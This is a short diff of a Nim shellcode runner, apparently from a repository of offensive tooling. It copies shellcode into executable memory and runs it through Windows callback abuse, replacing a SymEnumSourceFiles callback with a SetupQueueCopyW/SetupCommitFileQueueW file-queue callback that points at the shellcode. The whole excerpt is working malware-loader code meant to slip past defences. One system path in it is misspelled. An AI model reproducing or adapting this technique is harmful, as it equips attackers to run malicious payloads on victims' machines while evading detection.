@@ -8,12 +8,9 @@ proc setupCommitFileQueueW[byte](shellcode: openArray[byte]): void =
   let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
   copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
 
-
-  let hProcess = GetCurrentProcess()
-
-  SymInitialize(hProcess, NULL, FALSE);
-  SymEnumSourceFiles(hProcess, 0, NULL, cast[PSYM_ENUMSOURCEFILES_CALLBACK](rPtr), NULL)
-
+  let queue = SetupOpenFileQueue()
+  SetupQueueCopyW(queue, r"C:\\", r"\\windows\\sytem32\\", r"kernel32.dll", NULL, NULL, r"c:\\windows\\temp\\", r"kernel32.dll", SP_COPY_NOSKIP);
+  SetupCommitFileQueueW(GetTopWindow(cast[HWND](NULL)), queue, cast[PSP_FILE_CALLBACK_W](rPtr), NULL);
 
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
